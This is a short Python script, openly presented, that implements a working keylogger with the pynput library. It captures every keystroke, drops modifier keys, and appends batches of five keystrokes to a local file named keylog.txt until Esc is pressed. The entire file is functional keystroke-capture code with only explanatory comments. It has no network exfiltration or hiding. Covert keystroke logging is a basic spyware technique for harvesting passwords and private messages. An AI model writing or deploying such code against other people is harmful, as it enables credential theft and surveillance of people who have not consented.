# Pip install and import pynput libraries
import pynput
from pynput.keyboard import Key, Listener

# Define count and keys variables 
# count = to write to file incrementally, to account for user possibly ending program without 'esc' key
count = 0
# keys = empty list to store key strokes
keys = []

# Define on_press function for Listener
def press(key):
    global keys, count
    keys.append(key)
    count += 1
    # Write to file every 5 keystrokes, then rest keys varible to empty and count variable to 0 
    if count >=5:
        count = 0
        write(keys)
        keys = []

def write(keys):
    # Create 'keylog.txt' file manually or use "w"
    with open("keylog.txt", "a") as f:
        # Clean up "'" and replace spacebar with a new line
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            # Write everything to the file that isnt a shift, backspace, tab, etc    
            elif k.find("Key") == -1:
                f.write(k)

# Define on_release function for Listener
def release(key):
    # Loop will break when you hit the escape key
    if key == Key.esc:
        return False


with Listener(on_press=press, on_release=release) as listener:
    listener.join()

